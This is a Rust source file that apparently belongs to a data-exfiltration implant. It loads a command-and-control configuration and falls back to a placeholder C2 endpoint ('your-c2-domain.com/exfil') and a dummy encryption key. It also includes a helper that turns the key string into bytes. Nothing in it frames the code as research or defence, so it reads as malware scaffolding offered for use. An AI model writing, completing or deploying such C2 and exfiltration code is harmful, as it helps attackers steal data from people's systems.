use serde::Deserialize;

#[derive(Deserialize)]
pub struct Config {
    pub c2: C2Config,
}

#[derive(Deserialize)]
pub struct C2Config {
    pub url: String,
    pub encryption_key: String,
}

pub fn load_config() -> Config {
    let content = std::fs::read_to_string("config.toml").unwrap_or_else(|_| {
        r#"[c2]
url = "https://your-c2-domain.com/exfil"
encryption_key = "99999999999999999999999999999999""#.to_string()
    });
    toml::from_str(&content).unwrap_or_else(|_| Config {
        c2: C2Config {
            url: "https://your-c2-domain.com/exfil".to_string(),
            encryption_key: "99999999999999999999999999999999".to_string(),
        },
    })
}

pub fn parse_key(key_str: &str) -> [u8; 32] {
    let mut key = [0u8; 32];
    for (i, byte) in key_str.as_bytes().iter().enumerate() {
        if i < 32 {
            key[i] = *byte;
        }
    }
    key
}